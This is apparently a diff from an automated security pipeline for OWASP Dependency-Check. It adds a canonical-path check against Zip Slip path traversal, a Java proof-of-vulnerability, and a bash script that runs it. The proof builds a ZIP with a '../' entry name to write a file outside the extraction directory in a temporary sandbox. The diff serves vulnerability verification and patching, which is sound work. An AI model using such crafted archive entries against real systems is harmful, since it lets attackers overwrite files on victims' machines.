+     * Determines whether the given file is contained within the given
+     * destination directory. This is used to guard against path traversal
+     * (a.k.a. "Zip Slip") attacks where a malicious archive entry name -
+     * e.g. containing <code>../</code> sequences or an absolute path -
+     * could otherwise cause a file to be created outside of the intended
+     * extraction directory.
+     *
+     * @param destination the intended extraction destination directory
+     * @param file the candidate file, typically built from
+     * <code>new File(destination, entry.getName())</code>
+     * @return <code>true</code> if the file's canonical path is the
+     * destination directory or a descendant of it; otherwise
+     * <code>false</code>
+     */
+    private static boolean isFileWithinDestination(File destination, File file) {
+        try {
+            final String destinationPath = destination.getCanonicalPath();
+            final String filePath = file.getCanonicalPath();
+            return filePath.equals(destinationPath) || filePath.startsWith(destinationPath + File.separator);
+        } catch (IOException ex) {
+            LOGGER.debug("Unable to determine canonical path for '{}'", file, ex);

+        }

+/**
+ * Proof-of-Vulnerability for CWE-022 (Zip Slip / Path Traversal) in
+ * {@code org.owasp.dependencycheck.analyzer.ArchiveAnalyzer}.
+ *
+ * The archive extraction routine builds the output file as
+ * {@code new File(destination, entry.getName())} (ArchiveAnalyzer.java:516)
+ * without validating that the resolved path stays within {@code destination}.
+ * A crafted archive entry whose name contains {@code ../} therefore escapes
+ * the extraction directory and is written to an attacker-controlled location
+ * on disk via:
+ *   - directory-entry sink: {@code file.mkdirs()} (line 518)
+ *   - file-entry sinks: {@code parent.mkdirs()} (line 543) and
+ *     {@code new FileOutputStream(file)} (line 547) inside
+ *     {@code extractAcceptedFile}.
+ *
+ * This POV drives the real, unmodified vulnerable method
+ * {@code ArchiveAnalyzer.extractFiles(File, File, Engine)} with a malicious ZIP
+ * and then checks whether a file materialised OUTSIDE the extraction directory
+ * (exercising the extractAcceptedFile / FileOutputStream sink chain, i.e. the
+ * traces ending at lines 543 and 547).
+ *
+ *   exit 0  -> traversal succeeded (vulnerable code)
+ *   exit 1  -> traversal blocked   (patched code)
+ */
+public class ZipSlipPov {
+
+    public static void main(String[] args) throws Exception {
+        // Isolated sandbox that contains everything the POV touches.
+        final File sandbox = Files.createTempDirectory("dc-zipslip-pov").toFile();
+
+        // The directory the analyzer is told to extract into.
+        final File destination = new File(sandbox, "extract-here");
+        if (!destination.mkdirs()) {
+            throw new IllegalStateException("could not create destination dir");
+        }
+
+        // The path we expect a SECURE extractor to never write to: a sibling of
+        // the destination directory, i.e. clearly outside the extraction root.
+        final File escapedTarget = new File(sandbox, "PWNED_outside_destination.txt");
+        // Malicious archive entry: "../PWNED_outside_destination.txt" resolves,
+        // relative to <destination>, to <sandbox>/PWNED_outside_destination.txt.
+        final String maliciousEntryName = "../" + escapedTarget.getName();
+
+        // Build the malicious ZIP archive (must end in .zip to hit the zip path).
+        final File maliciousZip = new File(sandbox, "malicious.zip");
+        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(maliciousZip))) {
+            final ZipEntry entry = new ZipEntry(maliciousEntryName);
+            zos.putNextEntry(entry);
+            zos.write("owned-by-zip-slip".getBytes("UTF-8"));
+            zos.closeEntry();
+        }
+
+        if (escapedTarget.exists()) {
+            throw new IllegalStateException("target already exists before extraction");
+        }
+
+        final Settings settings = new Settings();
+
+        // Real ArchiveAnalyzer instance, initialized like in production.
+        final ArchiveAnalyzer analyzer = new ArchiveAnalyzer();
+        analyzer.initialize(settings);
+
+        // Real Engine; accept() is overridden to return true so the crafted
+        // entry is treated as an analyzable file. This models an archive that
+        // contains a supported dependency file and does NOT touch the extraction
+        // path-handling logic under test (the vulnerable code path we exercise
+        // is entirely inside ArchiveAnalyzer.extractArchive/extractAcceptedFile).
+        final Engine engine = new Engine(Engine.Mode.EVIDENCE_COLLECTION, settings) {
+            @Override

+            }
+        };
+

+        final Method extractFiles = ArchiveAnalyzer.class.getDeclaredMethod(

+    }

+#!/usr/bin/env bash
+# POV runner for CWE-022 Zip Slip in ArchiveAnalyzer.
+# Must be run from /workspace/repo inside the project container.
+set -euo pipefail
+
+REPO="$(cd "$(dirname "$0")/../.." && pwd)"
+POV_DIR="$REPO/.security-pipeline/pov"
+
+# 1. Ensure core module and its sibling modules are installed to the local repo
+#    (needed so the classpath of internal dependencies like utils resolves).
+mvn -q -B -pl core -am -DskipTests install
+
+# 2. Resolve the runtime classpath of the core module.
+CP_FILE="$POV_DIR/cp.txt"
+mvn -q -B -pl core dependency:build-classpath -Dmdep.outputFile="$CP_FILE" >/dev/null
+
+CP="$REPO/core/target/classes:$REPO/core/target/test-classes:$(cat "$CP_FILE")"
+
+# 3. Compile the POV.
+mkdir -p "$POV_DIR/out"
+javac -cp "$CP" -d "$POV_DIR/out" "$POV_DIR/ZipSlipPov.java"
+
+# 4. Run the POV.
+java -cp "$CP:$POV_DIR/out" ZipSlipPov
